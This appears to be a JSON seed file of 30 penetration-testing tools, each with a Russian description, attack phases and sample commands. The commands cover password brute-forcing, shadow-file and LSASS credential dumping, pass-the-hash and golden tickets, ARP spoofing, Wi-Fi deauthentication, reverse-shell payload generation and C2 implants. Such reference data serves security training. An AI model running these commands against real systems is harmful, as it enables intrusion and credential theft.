@@ -1,0 +1,757 @@
+[
+  {
+    "id": "TOOL-SEED-001",
+    "name": "Hydra (THC-Hydra)",
+    "type": "exploitation",
+    "description": "Параллельный сетевой подборщик паролей с поддержкой множества протоколов: SSH, RDP, FTP, HTTP(S), SMB, MySQL, PostgreSQL, VNC, IMAP, POP3 и других.",
+    "url": "https://github.com/vanhauser-thc/thc-hydra",
+    "applicable_attack_types": ["brute_force", "password_guessing", "credential_access"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Перебор пароля SSH по словарю",
+        "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
+        "",
+        "# Перебор пользователей и паролей RDP",
+        "hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>",
+        "",
+        "# Подбор HTTP basic auth",
+        "hydra -l admin -P passwords.txt <TARGET_IP> http-get /admin/",
+        "",
+        "# Подбор формы входа (POST)",
+        "hydra -l admin -P passwords.txt <TARGET_IP> http-post-form '/login.php:user=^USER^&pass=^PASS^:F=Invalid'"
+      ]
+    },
+    "phases": ["Получение учётных данных", "Эксплуатация"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-002",
+    "name": "John the Ripper",
+    "type": "credential_cracking",
+    "description": "Локальный парольный взломщик хешей (NTLM, MD5, bcrypt, SHA-*, Kerberos AS-REP/TGS, ZIP/PDF, ОС-теневые файлы).",
+    "url": "https://www.openwall.com/john/",
+    "applicable_attack_types": ["credential_access", "credential_cracking"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Подготовка теневого файла Linux",
+        "unshadow /etc/passwd /etc/shadow > unshadowed.txt",
+        "john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt",
+        "john --show unshadowed.txt",
+        "",
+        "# Взлом NTLM-хешей",
+        "john --format=NT --wordlist=rockyou.txt hashes.txt",
+        "",
+        "# Взлом Kerberos AS-REP roast",
+        "john --wordlist=rockyou.txt asrep_hashes.txt"
+      ]
+    },
+    "phases": ["Получение учётных данных", "Пост-эксплуатация"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-003",
+    "name": "Hashcat",
+    "type": "credential_cracking",
+    "description": "Высокопроизводительный взломщик хешей с поддержкой GPU. Поддерживает 350+ типов хешей и сложные правила атак (комбинаторные, маски, гибридные).",
+    "url": "https://hashcat.net/hashcat/",
+    "applicable_attack_types": ["credential_access", "credential_cracking"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Атака по словарю на NTLM",
+        "hashcat -m 1000 hashes.txt rockyou.txt",
+        "",
+        "# Маска ?l?l?l?l?d?d (4 буквы + 2 цифры)",
+        "hashcat -m 0 hashes.txt -a 3 ?l?l?l?l?d?d",
+        "",
+        "# Атака с правилами",
+        "hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+      ]
+    },
+    "phases": ["Получение учётных данных", "Пост-эксплуатация"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-SEED-004",
+    "name": "Burp Suite",
+    "type": "web_proxy",
+    "description": "Перехватывающий прокси для тестирования веб-приложений: ручное и автоматизированное обнаружение SQLi, XSS, IDOR, SSRF, аутентификационных уязвимостей; включает Repeater, Intruder, Scanner.",
+    "url": "https://portswigger.net/burp",
+    "applicable_attack_types": [
+      "sql_injection", "cross_site_scripting", "server_side_request_forgery",
+      "authentication_bypass", "directory_traversal", "command_injection",
+      "deserialization_attack"
+    ],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск Burp Suite Community",
+        "java -jar burpsuite_community.jar",
+        "",
+        "# Настройка прокси-цепочки в браузере: 127.0.0.1:8080",
+        "# Перехват: Proxy -> Intercept -> Intercept on",
+        "# Повтор запроса: правый клик -> Send to Repeater"
+      ]
+    },
+    "phases": ["Сканирование", "Эксплуатация"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-005",
+    "name": "OWASP ZAP",
+    "type": "web_proxy",
+    "description": "Открытый сканер уязвимостей веб-приложений от OWASP, альтернатива Burp с автосканером, фуззером и API.",
+    "url": "https://www.zaproxy.org/",
+    "applicable_attack_types": [
+      "sql_injection", "cross_site_scripting", "directory_traversal",
+      "authentication_bypass", "server_side_request_forgery"
+    ],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Активный скан в headless-режиме",
+        "zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://<TARGET>/",
+        "",
+        "# Автомат через Docker",
+        "docker run -t owasp/zap2docker-stable zap-baseline.py -t http://<TARGET>/"
+      ]
+    },
+    "phases": ["Сканирование", "Эксплуатация"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-006",
+    "name": "Nikto",
+    "type": "scanning",
+    "description": "Сканер веб-серверов: ищет 6700+ опасных файлов/CGI, устаревшие версии, конфигурационные ошибки, известные CVE.",
+    "url": "https://github.com/sullo/nikto",
+    "applicable_attack_types": ["reconnaissance", "vulnerability_scanning"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Базовое сканирование",
+        "nikto -h http://<TARGET_IP>",
+        "",
+        "# С указанием порта и SSL",
+        "nikto -h <TARGET_IP> -p 443 -ssl",
+        "",
+        "# Вывод в HTML-отчёт",
+        "nikto -h http://<TARGET_IP> -o report.html -Format html"
+      ]
+    },
+    "phases": ["Разведка", "Сканирование"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-007",
+    "name": "Gobuster",
+    "type": "scanning",
+    "description": "Быстрый перебор каталогов, файлов, поддоменов и виртуальных хостов веб-серверов.",
+    "url": "https://github.com/OJ/gobuster",
+    "applicable_attack_types": ["reconnaissance", "directory_traversal"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Перебор каталогов",
+        "gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt",
+        "",
+        "# Перебор поддоменов",
+        "gobuster dns -d <TARGET_DOMAIN> -w /usr/share/wordlists/subdomains.txt",
+        "",
+        "# vhost discovery",
+        "gobuster vhost -u http://<TARGET>/ -w subdomains.txt"
+      ]
+    },
+    "phases": ["Разведка", "Сканирование"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-008",
+    "name": "ffuf",
+    "type": "scanning",
+    "description": "Параметрический и каталожный фуззер веб-приложений; быстрая альтернатива Gobuster/wfuzz.",
+    "url": "https://github.com/ffuf/ffuf",
+    "applicable_attack_types": ["reconnaissance", "parameter_discovery"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Перебор каталогов",
+        "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<TARGET>/FUZZ",
+        "",
+        "# Перебор параметров",
+        "ffuf -w params.txt -u 'http://<TARGET>/page?FUZZ=test' -fs 0",
+        "",
+        "# Перебор поддоменов через Host",
+        "ffuf -w subdomains.txt -u http://<TARGET_IP> -H 'Host: FUZZ.example.com' -fs 4242"
+      ]
+    },
+    "phases": ["Разведка", "Сканирование"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-009",
+    "name": "Responder",
+    "type": "credential_access",
+    "description": "LLMNR/NBT-NS/MDNS/WPAD-отравитель и SMB-релей: перехват NTLM-хешей в локальной сети.",
+    "url": "https://github.com/lgandx/Responder",
+    "applicable_attack_types": ["credential_access", "man_in_the_middle"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск отравителя на интерфейсе eth0",
+        "responder -I eth0 -wrf",
+        "",
+        "# Сохранённые хеши",
+        "ls /usr/share/responder/logs/ | grep NTLMv2",
+        "",
+        "# Отключить SMB/HTTP в Responder.conf, чтобы использовать ntlmrelayx",
+        "sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf"
+      ]
+    },
+    "phases": ["Получение учётных данных", "Горизонтальное перемещение"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-SEED-010",
+    "name": "Impacket",
+    "type": "post_exploitation",
+    "description": "Коллекция Python-инструментов для работы с протоколами Windows: SMB, MSRPC, LDAP, Kerberos. Включает psexec.py, smbexec.py, secretsdump.py, GetUserSPNs.py, ntlmrelayx.py.",
+    "url": "https://github.com/fortra/impacket",
+    "applicable_attack_types": [
+      "lateral_movement", "credential_access", "remote_code_execution",
+      "kerberoasting"
+    ],
+    "applicable_cve": ["CVE-2020-1472", "CVE-2021-42278", "CVE-2021-42287"],
+    "commands": {
+      "default": [
+        "# Удалённое выполнение через SMB",
+        "psexec.py DOMAIN/user:PASS@<TARGET_IP>",
+        "",
+        "# Дамп LSA/SAM/NTDS",
+        "secretsdump.py -just-dc DOMAIN/admin:PASS@<DC_IP>",
+        "",
+        "# Kerberoasting",
+        "GetUserSPNs.py DOMAIN/user:PASS -dc-ip <DC_IP> -request",
+        "",
+        "# NTLM relay",
+        "ntlmrelayx.py -tf targets.txt -smb2support"
+      ]
+    },
+    "phases": ["Эксплуатация", "Пост-эксплуатация", "Горизонтальное перемещение"],
+    "skill_level": "Advanced",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-SEED-011",
+    "name": "CrackMapExec",
+    "type": "post_exploitation",
+    "description": "Инструмент пост-эксплуатации Active Directory: проверка валидности учёток, дамп хешей, выполнение команд, поиск SMB-шар.",
+    "url": "https://github.com/Porchetta-Industries/CrackMapExec",
+    "applicable_attack_types": [
+      "credential_access", "lateral_movement", "remote_code_execution"
+    ],
+    "applicable_cve": ["CVE-2020-1472", "CVE-2017-0144"],
+    "commands": {
+      "default": [
+        "# Проверка валидности учёток на сети",
+        "crackmapexec smb 192.168.1.0/24 -u administrator -p 'Passw0rd!'",
+        "",
+        "# Выполнение команды",
+        "crackmapexec smb <TARGET_IP> -u admin -p PASS -x 'whoami'",
+        "",
+        "# Дамп SAM",
+        "crackmapexec smb <TARGET_IP> -u admin -p PASS --sam"
+      ]
+    },
+    "phases": ["Пост-эксплуатация", "Горизонтальное перемещение"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-SEED-012",
+    "name": "BloodHound",
+    "type": "reconnaissance",
+    "description": "Граф-анализ Active Directory: ищет атакующие пути от любого пользователя к привилегиям Domain Admin (использует Neo4j).",
+    "url": "https://github.com/SpecterOps/BloodHound",
+    "applicable_attack_types": ["reconnaissance", "privilege_escalation", "lateral_movement"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сбор данных через SharpHound (Windows)",
+        "SharpHound.exe -c All",
+        "",
+        "# Сбор через Python (bloodhound-python)",
+        "bloodhound-python -d DOMAIN.local -u user -p PASS -ns <DC_IP> -c All",
+        "",
+        "# Импорт в BloodHound GUI и запрос: 'Find Shortest Paths to Domain Admins'"
+      ]
+    },
+    "phases": ["Разведка", "Повышение привилегий"],
+    "skill_level": "Advanced",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-SEED-013",
+    "name": "Mimikatz",
+    "type": "post_exploitation",
+    "description": "Инструмент извлечения учётных данных из памяти Windows (LSASS): NTLM-хеши, Kerberos-тикеты, plaintext-пароли. Используется для Pass-the-Hash, Pass-the-Ticket, Golden Ticket.",
+    "url": "https://github.com/gentilkiwi/mimikatz",
+    "applicable_attack_types": [
+      "credential_access", "credential_dumping", "lateral_movement",
+      "privilege_escalation"
+    ],
+    "applicable_cve": ["CVE-2020-1472"],
+    "commands": {
+      "default": [
+        "# Запуск Mimikatz",
+        "mimikatz.exe",
+        "",
+        "# Дамп паролей и хешей",
+        "privilege::debug",
+        "sekurlsa::logonpasswords",
+        "",
+        "# Pass-the-Hash",
+        "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<HASH> /run:cmd.exe",
+        "",
+        "# Golden Ticket",
+        "kerberos::golden /domain:DOMAIN /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /user:Administrator /ptt"
+      ]
+    },
+    "phases": ["Получение учётных данных", "Пост-эксплуатация", "Горизонтальное перемещение"],
+    "skill_level": "Advanced",
+    "os": ["Windows"]
+  },
+  {
+    "id": "TOOL-SEED-014",
+    "name": "Empire / Starkiller",
+    "type": "command_and_control",
+    "description": "Пост-эксплуатационный фреймворк (PowerShell/Python) для скрытного управления заражёнными хостами; преемник PowerShell Empire.",
+    "url": "https://github.com/BC-SECURITY/Empire",
+    "applicable_attack_types": [
+      "command_and_control", "post_exploitation", "persistence",
+      "remote_code_execution"
+    ],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск сервера",
+        "./ps-empire server",
+        "",
+        "# Запуск клиента",
+        "./ps-empire client",
+        "",
+        "# В клиенте:",
+        "uselistener http",
+        "set Port 8080",
+        "execute",
+        "usestager windows/launcher_bat http",
+        "execute"
+      ]
+    },
+    "phases": ["Командное управление", "Пост-эксплуатация", "Закрепление"],
+    "skill_level": "Advanced",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-SEED-015",
+    "name": "Aircrack-ng",
+    "type": "wireless",
+    "description": "Набор для аудита Wi-Fi: захват handshake, взлом WEP/WPA/WPA2-PSK, инъекция пакетов, тестирование точек доступа.",
+    "url": "https://www.aircrack-ng.org/",
+    "applicable_attack_types": ["wireless_attack", "credential_cracking"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Перевод интерфейса в monitor mode",
+        "airmon-ng start wlan0",
+        "",
+        "# Сканирование сетей",
+        "airodump-ng wlan0mon",
+        "",
+        "# Захват handshake конкретной сети",
+        "airodump-ng --bssid <BSSID> -c <CHANNEL> -w capture wlan0mon",
+        "",
+        "# Деаутентификация клиента (форсирует переподключение)",
+        "aireplay-ng --deauth 10 -a <BSSID> wlan0mon",
+        "",
+        "# Взлом по словарю",
+        "aircrack-ng -w wordlist.txt -b <BSSID> capture-01.cap"
+      ]
+    },
+    "phases": ["Сканирование", "Получение учётных данных"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-SEED-016",
+    "name": "Bettercap",
+    "type": "network_attack",
+    "description": "Универсальный инструмент MITM-атак: ARP-poisoning, DNS-spoofing, SSL-stripping, Wi-Fi recon, BLE/HID-инъекции.",
+    "url": "https://www.bettercap.org/",
+    "applicable_attack_types": ["man_in_the_middle", "credential_access", "wireless_attack"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск интерактивного режима",
+        "sudo bettercap -iface eth0",
+        "",
+        "# В интерактивном меню:",
+        "net.probe on",
+        "net.recon on",
+        "set arp.spoof.targets <TARGET_IP>",
+        "arp.spoof on",
+        "set net.sniff.verbose true",
+        "net.sniff on"
+      ]
+    },
+    "phases": ["Разведка", "Получение учётных данных"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-017",
+    "name": "theHarvester",
+    "type": "reconnaissance",
+    "description": "OSINT-сборщик email-адресов, поддоменов, имён сотрудников и хостов из публичных источников (Google, Bing, LinkedIn, Shodan, Crt.sh и др.).",
+    "url": "https://github.com/laramies/theHarvester",
+    "applicable_attack_types": ["reconnaissance", "osint"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сбор email и поддоменов",
+        "theHarvester -d example.com -b all -l 500",
+        "",
+        "# Только Google",
+        "theHarvester -d example.com -b google",
+        "",
+        "# Запись результатов",
+        "theHarvester -d example.com -b all -f results"
+      ]
+    },
+    "phases": ["Разведка"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-018",
+    "name": "Wireshark / tshark",
+    "type": "network_analysis",
+    "description": "Захват и глубокий анализ сетевых пакетов: ищет учётные данные в открытом виде, аномалии, утечки, эксплойт-сигнатуры.",
+    "url": "https://www.wireshark.org/",
+    "applicable_attack_types": ["reconnaissance", "credential_access", "traffic_analysis"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Захват трафика",
+        "tshark -i eth0 -w capture.pcapng",
+        "",
+        "# Поиск пакетов с FTP-паролями",
+        "tshark -r capture.pcapng -Y 'ftp.request.command == \"PASS\"'",
+        "",
+        "# Извлечение HTTP-объектов",
+        "tshark -r capture.pcapng --export-objects http,/tmp/httpobj"
+      ]
+    },
+    "phases": ["Разведка", "Анализ"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-019",
+    "name": "Nuclei",
+    "type": "vulnerability_scanning",
+    "description": "Шаблонный сканер уязвимостей с открытым каталогом из 7000+ шаблонов (YAML): CVE, конфигурации, утечки, дефолтные пароли.",
+    "url": "https://github.com/projectdiscovery/nuclei",
+    "applicable_attack_types": ["vulnerability_scanning", "reconnaissance"],
+    "applicable_cve": ["CVE-2021-44228", "CVE-2017-5638", "CVE-2021-26855"],
+    "commands": {
+      "default": [
+        "# Базовый скан с актуальными шаблонами",
+        "nuclei -u https://<TARGET>/",
+        "",
+        "# Сканирование списка хостов с тегом cves",
+        "nuclei -l hosts.txt -tags cves -severity high,critical",
+        "",
+        "# Скан с конкретным шаблоном",
+        "nuclei -u https://<TARGET>/ -t cves/2021/CVE-2021-44228.yaml"
+      ]
+    },
+    "phases": ["Сканирование", "Разведка"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-020",
+    "name": "Searchsploit / Exploit-DB",
+    "type": "exploit_search",
+    "description": "Локальная база эксплойтов Exploit-DB с офлайн-поиском по сервисам, версиям, CVE.",
+    "url": "https://www.exploit-db.com/",
+    "applicable_attack_types": ["exploit_research", "vulnerability_scanning"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Установка",
+        "sudo apt install exploitdb",
+        "",
+        "# Поиск по продукту",
+        "searchsploit apache 2.4",
+        "",
+        "# Поиск по CVE",
+        "searchsploit --cve 2021-44228",
+        "",
+        "# Скопировать эксплойт в текущую папку",
+        "searchsploit -m 50592"
+      ]
+    },
+    "phases": ["Разведка", "Эксплуатация"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-021",
+    "name": "Cobalt Strike",
+    "type": "command_and_control",
+    "description": "Коммерческий C2-фреймворк для red team: payload-генерация, beacon-имплант, lateral movement, фишинг-кампании. Часто эмулируется в обучении.",
+    "url": "https://www.cobaltstrike.com/",
+    "applicable_attack_types": ["command_and_control", "post_exploitation", "lateral_movement"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск teamserver",
+        "./teamserver <C2_IP> <PASSWORD> profile.profile",
+        "",
+        "# Запуск клиента",
+        "./cobaltstrike",
+        "",
+        "# В GUI: Cobalt Strike -> Listeners -> Add (HTTP/DNS)",
+        "# Attacks -> Packages -> Windows Executable -> beacon.exe"
+      ]
+    },
+    "phases": ["Командное управление", "Пост-эксплуатация"],
+    "skill_level": "Advanced",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-SEED-022",
+    "name": "Sliver",
+    "type": "command_and_control",
+    "description": "Открытый кросс-платформенный C2-фреймворк (Go); современная альтернатива Cobalt Strike с шифрованным транспортом mTLS/HTTP/DNS/WireGuard.",
+    "url": "https://github.com/BishopFox/sliver",
+    "applicable_attack_types": ["command_and_control", "post_exploitation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Запуск сервера",
+        "sliver-server",
+        "",
+        "# Внутри Sliver:",
+        "generate --mtls <C2_IP>:8888 --save /tmp/implant.exe",
+        "mtls --lport 8888",
+        "sessions",
+        "use <session_id>",
+        "execute -o whoami"
+      ]
+    },
+    "phases": ["Командное управление", "Пост-эксплуатация"],
+    "skill_level": "Advanced",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-023",
+    "name": "Wfuzz",
+    "type": "scanning",
+    "description": "Веб-фуззер для перебора параметров запросов, заголовков, аутентификационных форм; поддерживает фильтры по коду и размеру ответа.",
+    "url": "https://github.com/xmendez/wfuzz",
+    "applicable_attack_types": ["reconnaissance", "parameter_discovery", "authentication_bypass"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Перебор каталогов",
+        "wfuzz -c -w common.txt --hc 404 http://<TARGET>/FUZZ",
+        "",
+        "# Перебор GET-параметров",
+        "wfuzz -c -w params.txt --hh 0 'http://<TARGET>/page?FUZZ=1'",
+        "",
+        "# Brute force POST-формы",
+        "wfuzz -c -w users.txt -d 'login=FUZZ&password=test' --hc 200 http://<TARGET>/login"
+      ]
+    },
+    "phases": ["Сканирование"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-024",
+    "name": "MSFvenom",
+    "type": "payload_generation",
+    "description": "Генератор полезных нагрузок Metasploit: исполняемые файлы, скрипты, shellcode для разных архитектур и кодировок.",
+    "url": "https://www.metasploit.com/",
+    "applicable_attack_types": ["remote_code_execution", "payload_delivery"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Reverse-shell для Windows EXE",
+        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o shell.exe",
+        "",
+        "# Linux ELF",
+        "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf -o shell.elf",
+        "",
+        "# Web-shell PHP",
+        "msfvenom -p php/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f raw -o shell.php"
+      ]
+    },
+    "phases": ["Эксплуатация", "Пост-эксплуатация"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-025",
+    "name": "WPScan",
+    "type": "vulnerability_scanning",
+    "description": "Сканер WordPress: ищет известные уязвимости ядра, плагинов, тем, перебирает пользователей и пароли.",
+    "url": "https://wpscan.com/",
+    "applicable_attack_types": ["vulnerability_scanning", "brute_force", "reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Скан WordPress-сайта",
+        "wpscan --url http://<TARGET>/",
+        "",
+        "# Поиск пользователей и плагинов",
+        "wpscan --url http://<TARGET>/ --enumerate u,p,t",
+        "",
+        "# Подбор пароля",
+        "wpscan --url http://<TARGET>/ --usernames admin --passwords rockyou.txt"
+      ]
+    },
+    "phases": ["Разведка", "Сканирование", "Эксплуатация"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-026",
+    "name": "Evil-WinRM",
+    "type": "post_exploitation",
+    "description": "Удобный клиент WinRM для пост-эксплуатации Windows: загрузка/скачивание файлов, выполнение скриптов, переход в Pass-the-Hash.",
+    "url": "https://github.com/Hackplayers/evil-winrm",
+    "applicable_attack_types": ["lateral_movement", "remote_code_execution", "credential_access"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Подключение по паролю",
+        "evil-winrm -i <TARGET_IP> -u administrator -p 'PASS'",
+        "",
+        "# Подключение через NTLM-хеш (PtH)",
+        "evil-winrm -i <TARGET_IP> -u administrator -H <NTLM_HASH>",
+        "",
+        "# Загрузка файла на хост",
+        "upload local_payload.exe C:\\Windows\\Temp\\p.exe"
+      ]
+    },
+    "phases": ["Пост-эксплуатация", "Горизонтальное перемещение"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-027",
+    "name": "Sherlock",
+    "type": "reconnaissance",
+    "description": "OSINT-инструмент для поиска присутствия имени пользователя в 400+ соцсетях и сервисах.",
+    "url": "https://github.com/sherlock-project/sherlock",
+    "applicable_attack_types": ["osint", "reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Поиск username в сети",
+        "sherlock <USERNAME>",
+        "",
+        "# Несколько имён сразу",
+        "sherlock user1 user2 user3 --print-found"
+      ]
+    },
+    "phases": ["Разведка"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-028",
+    "name": "SecLists",
+    "type": "wordlists",
+    "description": "Самый известный набор словарей для пентеста: пароли, имена пользователей, payload-ы для XSS/SQLi/SSRF, payloads для фуззинга.",
+    "url": "https://github.com/danielmiessler/SecLists",
+    "applicable_attack_types": ["brute_force", "fuzzing", "reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Установка",
+        "git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists",
+        "",
+        "# Использование пароля для Hydra",
+        "hydra -l admin -P /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt ssh://<TARGET>"
+      ]
+    },
+    "phases": ["Разведка", "Эксплуатация"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-029",
+    "name": "Pwntools",
+    "type": "exploit_development",
+    "description": "Python-фреймворк для разработки эксплойтов: упрощает работу с сокетами, ROP-цепочками, форматами ELF/PE, отладкой.",
+    "url": "https://github.com/Gallopsled/pwntools",
+    "applicable_attack_types": ["exploit_development", "buffer_overflow", "remote_code_execution"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Установка",
+        "pip install pwntools",
+        "",
+        "# Шаблон эксплойта",
+        "from pwn import *",
+        "p = remote('<TARGET>', 31337)",
+        "payload = b'A' * 72 + p64(0xdeadbeef)",
+        "p.sendline(payload)",
+        "p.interactive()"
+      ]
+    },
+    "phases": ["Эксплуатация"],
+    "skill_level": "Advanced",
+    "os": ["Linux", "Windows", "macOS"]
+  },
+  {
+    "id": "TOOL-SEED-030",
+    "name": "Amass",
+    "type": "reconnaissance",
+    "description": "Глубокая разведка инфраструктуры: поиск поддоменов через сертификаты, DNS, веб-архивы, BGP, Whois.",
+    "url": "https://github.com/owasp-amass/amass",
+    "applicable_attack_types": ["reconnaissance", "osint"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Пассивное исследование домена",
+        "amass enum -passive -d example.com",
+        "",
+        "# Активное (с DNS-резолюцией)",
+        "amass enum -active -d example.com -src",
+        "",
+        "# Сохранение в БД",
+        "amass enum -d example.com -dir ./amass_output"
+      ]
+    },
+    "phases": ["Разведка"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows", "macOS"]
+  }
+]
